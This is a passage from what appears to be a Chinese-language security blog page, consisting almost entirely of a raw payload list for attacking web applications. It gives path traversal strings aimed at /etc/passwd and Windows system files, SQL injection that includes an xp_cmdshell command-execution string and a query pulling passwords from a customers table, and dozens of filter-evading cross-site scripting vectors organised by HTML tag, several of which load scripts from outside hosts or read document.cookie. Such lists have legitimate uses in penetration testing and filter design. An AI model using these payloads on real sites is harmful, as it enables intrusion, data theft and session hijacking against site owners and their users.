class="line">%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</span><br><span class="line">%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini</span><br><span class="line">%3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e</span><br><span class="line">%3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e</span><br><span class="line">%3cscript%3ealert(%22xss%22)%3c/script%3e/index.html</span><br><span class="line">%3f.jsp</span><br><span class="line">%3f.jsp</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">'Vulnerable'</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">'Vulnerable'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">?sql_debug=1</span><br><span class="line">a%5c.aspx</span><br><span class="line">a.jsp/<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">'Vulnerable'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">a/</span><br><span class="line">a?<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">'Vulnerable'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">"&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">'Vulnerable'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">';exec%20master..xp_cmdshell%20'dir%20 c:%20&gt;%20c:\inetpub\wwwroot\?.txt'--&amp;&amp;</span><br><span class="line">%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E</span><br><span class="line">%3Cscript%3Ealert(document. domain);%3C/script%3E&amp;</span><br><span class="line">%3Cscript%3Ealert(document.domain);%3C/script%3E&amp;SESSION_ID=&#123;SESSION_ID&#125;&amp;SESSION_ID=</span><br><span class="line">1%20union%20all%20select%20pass,0,0,0,0%20from%20customers%20where%20fname=</span><br><span class="line">http://www.cnblogs.com/http://www.cnblogs.com/http://www.cnblogs.com/http://www.cnblogs.com/etc/passwd</span><br><span class="line">..\..\..\..\..\..\..\..\windows\system.ini</span><br><span class="line">\..\..\..\..\..\..\..\..\windows\system.ini</span><br><span class="line">'';!--"<span class="tag">&lt;<span class="name">XSS</span>&gt;</span>=&amp;&#123;()&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">"javascript:alert('XSS');"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>'<span class="attr">XSS</span>')&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">JaVaScRiPt:alert(</span>'<span class="attr">XSS</span>')&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">JaVaScRiPt:alert(</span>"<span class="attr">XSS</span>")&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>'<span class="attr">XSS</span>')&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>'<span class="attr">XSS</span>')&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">"jav ascript:alert('XSS');"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">"jav ascript:alert('XSS');"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">"jav ascript:alert('XSS');"</span>&gt;</span></span><br><span class="line">"<span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">java\0script:alert(\</span>"<span class="attr">XSS</span>\")&gt;</span>";' &gt; out</span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">" javascript:alert('XSS');"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="javascript">a=<span class="regexp">/XSS/</span>alert(a.source)</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">BODY</span> <span class="attr">BACKGROUND</span>=<span class="string">"javascript:alert('XSS')"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">BODY</span> <span class="attr">ONLOAD</span>=<span class="string">alert(</span>'<span class="attr">XSS</span>')&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">DYNSRC</span>=<span class="string">"javascript:alert('XSS')"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">LOWSRC</span>=<span class="string">"javascript:alert('XSS')"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">BGSOUND</span> <span class="attr">src</span>=<span class="string">"javascript:alert('XSS');"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> <span class="attr">size</span>=<span class="string">"&amp;&#123;alert('XSS')&#125;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LAYER</span> <span class="attr">src</span>=<span class="string">"http://xss.ha.ckers.org/a.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">layer</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LINK</span> <span class="attr">REL</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"javascript:alert('XSS');"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">'vbscript:msgbox("XSS")'</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">"mocha:[code]"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">"livescript:[code]"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">META</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">"refresh"</span> <span class="attr">CONTENT</span>=<span class="string">"0;url=javascript:alert('XSS');"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IFRAME</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>'<span class="attr">XSS</span>')&gt;</span><span class="tag">&lt;/<span class="name">IFRAME</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">FRAMESET</span>&gt;</span><span class="tag">&lt;<span class="name">FRAME</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>'<span class="attr">XSS</span>')&gt;</span><span class="tag">&lt;/<span class="name">FRAME</span>&gt;</span><span class="tag">&lt;/<span class="name">FRAMESET</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">TABLE</span> <span class="attr">BACKGROUND</span>=<span class="string">"javascript:alert('XSS')"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">DIV</span> <span class="attr">STYLE</span>=<span class="string">"background-image: url(javascript:alert('XSS'))"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">DIV</span> <span class="attr">STYLE</span>=<span class="string">"behaviour: url('http://www.how-to-hack.org/exploit.html');"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">DIV</span> <span class="attr">STYLE</span>=<span class="string">"width: expression(alert('XSS'));"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE</span>&gt;</span><span class="undefined">@im\port'\ja\vasc\ript:alert("XSS")';</span><span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">STYLE</span>=<span class="string">'xss:expre\ssion(alert("XSS"))'</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE</span> <span class="attr">TYPE</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined">alert('XSS');</span><span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE</span> <span class="attr">TYPE</span>=<span class="string">"text/css"</span>&gt;</span><span class="css"><span class="selector-class">.XSS</span>&#123;<span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">"javascript:alert('XSS')"</span>);&#125;</span><span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span><span class="tag">&lt;<span class="name">A</span> <span class="attr">class</span>=<span class="string">"XSS"</span>&gt;</span><span class="tag">&lt;/<span class="name">A</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span><span class="css"><span class="selector-tag">BODY</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"javascript:alert('XSS')"</span>)&#125;</span><span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">BASE</span> <span class="attr">href</span>=<span class="string">"javascript:alert('XSS');//"</span>&gt;</span></span><br><span class="line">getURL("javascript:alert('XSS')")</span><br><span class="line">a="get";b="URL";c="javascript:";d="alert('XSS');";eval(a+b+c+d);</span><br><span class="line"><span class="tag">&lt;<span class="name">XML</span> <span class="attr">src</span>=<span class="string">"javascript:alert('XSS');"</span>&gt;</span></span><br><span class="line">"&gt; <span class="tag">&lt;<span class="name">BODY</span> <span class="attr">ONLOAD</span>=<span class="string">"a();"</span>&gt;</span><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span>&#123;alert(<span class="string">'XSS'</span>);&#125;</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span><span class="tag">&lt;<span class="name">"</span></span></span><br><span class="line">&lt;SCRIPT src="http://xss.ha.ckers.org/xss.jpg"&gt;&lt;/SCRIPT&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">"javascript:alert('XSS')"</span></span></span><br><span class="line">&lt;!--#exec cmd="/bin/echo '&lt;SCRIPT SRC'"--&gt;&lt;!--#exec cmd="/bin/echo '=http://xss.ha.ckers.org/a.js&gt;&lt;/SCRIPT&gt;'"--&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">"http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">a</span>=<span class="string">"&gt;"</span> <span class="attr">src</span>=<span class="string">"http://xss.ha.ckers.org/a.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span> =<span class="string">"&gt;"</span> <span class="attr">src</span>=<span class="string">"http://xss.ha.ckers.org/a.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">a</span>=<span class="string">"&gt;"</span> '' <span class="attr">src</span>=<span class="string">"http://xss.ha.ckers.org/a.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span> "<span class="attr">a</span>=<span class="string">'&gt;'</span>" <span class="attr">src</span>=<span class="string">"http://xss.ha.ckers.org/a.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.write(<span class="string">"&lt;SCRI"</span>);</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span>PT src="http://xss.ha.ckers.org/a.js"&gt;<span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">A</span> <span class="attr">href</span>=<span class="string">http://www.gohttp://www.google.com/ogle.com/</span>&gt;</span>link<span class="tag">&lt;/<span class="name">A</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="按标签分类的XSS-Payload"><a href="#按标签分类的XSS-Payload" class="headerlink" title="按标签分类的XSS Payload"></a>按标签分类的XSS Payload</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">";alert(1);//xx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">¼script¾alert(¢XSS¢)¼/script¾   //US-ASCII编码，如Tomcat</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--[if gte IE 4]&gt;</span></span><br><span class="line"><span class="comment">&lt;SCRIPT&gt;alert('XSS');&lt;/SCRIPT&gt;    //IE7以下</span></span><br><span class="line"><span class="comment">&lt;![endif]--&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(1);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert(1)"</span>&gt;</span>aaaa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"JavaSCript:alealertrt%25281%2529"</span>&gt;</span>aaaa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onclick</span>=<span class="string">alert(1)</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onmouseover</span>=<span class="string">alert(1)</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span>  //无需js标签，可直接执行</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">background</span>=<span class="string">"javascript:alert('XSS')"</span>&gt;</span>  //IE7以下</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">DIV</span> <span class="attr">style</span>=<span class="string">"background-image: url(javascript:alert('XSS'))"</span>&gt;</span>  //IE7以下</span><br><span class="line"><span class="tag">&lt;<span class="name">DIV</span> <span class="attr">style</span>=<span class="string">"width: expression(alert('XSS'));"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="</span> <span class="attr">type</span>=<span class="string">"image/svg+xml"</span> <span class="attr">allowscriptaccess</span>=<span class="string">"always"</span>&gt;</span><span class="tag">&lt;/<span class="name">embed</span>&gt;</span>  //Firefox/Chrome</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"javascript:alert(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span>    //Firefox/Chrome/Safari</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onmouseover</span>=<span class="string">"alert(document.cookie)"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">'"&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">onmouseover</span>=<span class="string">alert(1)</span>&gt;</span>  //IE</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">onmouseover</span>=<span class="string">alert(1)</span> <span class="attr">src</span>&gt;</span>  //IE</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onmouseover</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span>/<span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">alt</span>=<span class="string">al</span> <span class="attr">lang</span>=<span class="string">ert</span> <span class="attr">onerror</span>=<span class="string">top[url</span>=<span class="string">1]alt+lang[/url]</span>&gt;</span></span><br><span class="line">// 下面的img标签都是在IE7以下版本生效</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">JaVaScRiPt:alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">javascript:alert(String.fromCharCode(49))</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"jav   ascript:alert('XSS')"</span>&gt;</span>  <span class="comment">&lt;!-- 这里空格是tab --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"jav&amp;#x09;ascript:alert('XSS');"</span>&gt;</span> <span class="comment">&lt;!-- &amp;#x09;是tab --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"jav&amp;#x0D;ascript:alert('XSS');"</span>&gt;</span> <span class="comment">&lt;!-- &amp;#x0D;是回车 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">" &amp;#14;  javascript:alert('XSS');"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">DYNsrc</span>=<span class="string">"javascript:alert('XSS')"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">LOWsrc</span>=<span class="string">"javascript:alert('XSS')"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=`<span class="attr">javascript:alert</span>('<span class="attr">xxxxx</span>')`&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">'vbscript:msgbox("XSS")'</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">image</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"IMAGE"</span> <span class="attr">src</span>=<span class="string">"javascript:alert('XSS');"</span>&gt;</span> //IE7以下</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"javascript:alert('XSS');"</span>&gt;</span>  //IE7以下</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"refresh"</span> <span class="attr">content</span>=<span class="string">"x;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="</span>&gt;</span>  //Firefox</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">sCrIpt</span>&gt;</span><span class="undefined">alert(1)</span><span class="tag">&lt;/<span class="name">ScRipt</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">sCrsCrIptIpt</span>&gt;</span>alalertert(1)<span class="tag">&lt;/<span class="name">ScRsCrIptipt</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">\u0061\u006C\u0065\u0072\u0074(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>[url=<span class="number">0</span>]<span class="string">'alert'</span>[<span class="regexp">/url]</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">parent[url=<span class="number">1</span>]<span class="string">'alert'</span>[<span class="regexp">/url]</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">self[url=<span class="number">2</span>]<span class="string">'alert'</span>[<span class="regexp">/url]</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">top[url=<span class="number">3</span>]<span class="string">'alert'</span>[<span class="regexp">/url]</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://www.xss.com/1.js</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">[quote]<span class="tag">&lt;/<span class="name">script</span>&gt;</span>"&gt;'&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">String</span>.fromCharCode(<span class="number">49</span>))</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&lt;&lt;SCRIPT&gt;alert(1);//&lt;&lt;/SCRIPT&gt;[/quote]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"><span class="selector-tag">li</span>&#123;<span class="attribute">list-style-image</span>: <span class="built_in">url</span>(<span class="string">"javascript:alert('XSS')"</span>);&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">ul</span>&gt;</span><span class="tag">&lt;<span class="name">li</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">br</span>&gt;</span>  //IE7以下</span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"><span class="selector-tag">a</span>&#123;<span class="attribute">width</span>:<span class="built_in">expression</span>(alert(<span class="string">'11'</span>))&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"x"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>  //IE7以下</span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"><span class="selector-class">.xss</span>&#123;<span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">"javascript:alert('XSS')"</span>);&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">xss</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>  //IE7以下</span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span><span class="css"><span class="selector-tag">BODY</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"javascript:alert('XSS')"</span>);&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span>  //IE7以下</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">BACKGROUND</span>=<span class="string">"javascript:alert('XSS')"</span>&gt;</span>  